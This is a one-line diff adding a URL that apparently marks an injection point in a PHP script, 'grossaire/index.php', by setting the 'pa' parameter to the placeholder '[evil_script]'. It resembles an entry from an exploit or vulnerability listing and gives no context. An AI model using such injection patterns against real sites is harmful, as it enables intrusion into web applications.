@@ -1,0 +1,1 @@
+www.example.com/grossaire/index.php?pa=[evil_script]
